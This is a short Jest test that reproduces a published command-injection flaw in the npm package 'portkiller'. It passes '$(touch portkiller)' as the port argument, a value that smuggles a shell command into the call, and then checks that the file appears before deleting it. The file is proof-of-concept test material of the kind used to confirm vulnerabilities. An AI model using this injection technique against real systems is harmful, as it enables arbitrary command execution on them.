//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078537
test("Command Injection in portkiller", () => {
  const portkiller = require("portkiller");
  const fs = require("fs");
  const sleep = require("sleep");
  const path = "./portkiller";

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  portkiller("$(touch portkiller)", () => {});

  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {}); //deleting the file after creation
});